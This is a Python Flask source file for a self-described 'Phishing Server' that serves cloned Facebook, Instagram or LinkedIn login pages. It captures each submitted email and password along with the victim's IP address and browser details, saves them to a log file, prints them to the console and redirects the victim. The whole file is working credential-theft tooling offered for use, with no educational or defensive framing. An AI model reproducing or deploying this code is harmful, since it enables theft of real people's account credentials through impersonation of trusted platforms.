from flask import Flask, request, render_template, redirect
from datetime import datetime
import os
import logging
from user_agents import parse
import socket
import sys
import argparse

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24)

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception as e:
        print(f"Error getting IP address: {str(e)}")
        return "127.0.0.1"

def setup_logging():
    logger = logging.getLogger()
    for handler in logger.handlers[:]:
        logger.removeHandler(handler)
    
    logger.setLevel(logging.INFO)
    
    file_handler = logging.FileHandler('log.txt')
    file_handler.setLevel(logging.INFO)
    file_format = logging.Formatter('%(asctime)s - %(message)s')
    file_handler.setFormatter(file_format)
    
    console_handler = logging.StreamHandler()
    console_handler.setLevel(logging.INFO)
    console_format = logging.Formatter('%(message)s')
    console_handler.setFormatter(console_format)
    
    logger.addHandler(file_handler)
    logger.addHandler(console_handler)
    return logger

logger = setup_logging()

def log_credentials(email, password, platform):
    try:
        ip_address = request.remote_addr
        if request.headers.get('X-Forwarded-For'):
            ip_address = request.headers.get('X-Forwarded-For').split(',')[0]
            
        user_agent = parse(request.headers.get('User-Agent', ''))
        device_info = f"{user_agent.browser.family} {user_agent.browser.version_string} on {user_agent.os.family}"
        
        # Format for log file
        log_message = (
            f"Platform: {platform} | "
            f"IP: {ip_address} | "
            f"Device: {device_info} | "
            f"Email: {email} | "
            f"Password: {password}"
        )
        
        logger.info(log_message)
        
        # Custom console output
        print("\n" + "="*50)
        print("Credentials captured:")
        print("="*50)
        print(f"Platform: {platform}")
        print(f"IP Address: {ip_address}")
        print(f"Device: {device_info}")
        print(f"Email: {email}")
        print(f"Password: {password}")
        print("="*50 + "\n")
        
    except Exception as e:
        logger.error(f"Logging error: {str(e)}")
        print(f"[!] Error logging credentials: {str(e)}")

@app.route("/", methods=["GET", "POST"])
def login():
    platform = app.config.get('PLATFORM', 'facebook')
    
    if request.method == "POST":
        email = request.form.get("email", "").strip()
        password = request.form.get("password", "").strip()
        
        if email and password:
            log_credentials(email, password, platform)
        
        return redirect(app.config.get('REDIRECT_URL', 'https://www.linkedin.com/in/elkadhioussama/'))
    
    return render_template(f"{platform}.html")

def parse_arguments():
    parser = argparse.ArgumentParser(description='Phishing Server')
    parser.add_argument('--platform', choices=['facebook', 'instagram', 'linkedin'],
                       default='facebook', help='Platform to mimic')
    parser.add_argument('--redirect', default='https://www.linkedin.com/in/elkadhioussama/',
                       help='Redirect URL after login')
    return parser.parse_args()

if __name__ == "__main__":
    args = parse_arguments()
    app.config['PLATFORM'] = args.platform
    app.config['REDIRECT_URL'] = args.redirect
    
    local_ip = get_local_ip()
    port = 5000
    
    print("\n" + "="*50)
    print(f"Phishing Server Started Successfully")
    print("="*50)
    print(f"Target Platform: {args.platform}")
    print(f"Redirect URL: {args.redirect}")
    print(f"Local URL: http://127.0.0.1:{port}")
    print(f"Network URL: http://{local_ip}:{port}")
    print("="*50)
    print("Captured credentials will be saved to log.txt")
    print("Press CTRL+C to stop the server\n")
    
    # Debug mode for development
    app.run(host="0.0.0.0", port=port, debug=True)
    
    # For production use instead:
    # from waitress import serve
    # serve(app, host="0.0.0.0", port=port)